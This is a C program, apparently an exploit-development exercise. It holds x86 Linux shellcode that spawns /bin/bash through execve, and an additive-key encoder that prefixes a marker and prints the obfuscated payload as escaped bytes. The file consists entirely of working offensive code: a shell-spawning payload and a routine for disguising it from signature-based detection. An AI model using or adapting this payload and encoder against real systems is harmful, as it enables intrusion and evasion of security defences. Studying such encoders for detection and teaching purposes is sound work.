#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define KEYLENGTH 10

const char* keyword = "1234567890";
const char* key   = "4422338877";

unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


char* encode(unsigned char arr[], int arrLength, const unsigned char key[], int keyLength){
    unsigned char* encoded = malloc(sizeof(char) * (arrLength+KEYLENGTH));
    
    //First set the keyword elems 
    for(int i=0; i < KEYLENGTH; i++){
      encoded[i] = (keyword[i]+key[i%keyLength])%256;
    }

    //Then the actual shellcode
    for(int i=0; i<arrLength; i++){
      encoded[i+KEYLENGTH] = (arr[i]+key[i%keyLength])%256;
    }
    return encoded;
}

int main(){
    unsigned char* output = encode(shellcode,strlen(shellcode),key,strlen(key));
    
    for(int x = 0; x<strlen(shellcode)+KEYLENGTH;x++){
        printf("\\x%02x",output[x]);
    }

    return 0;
}
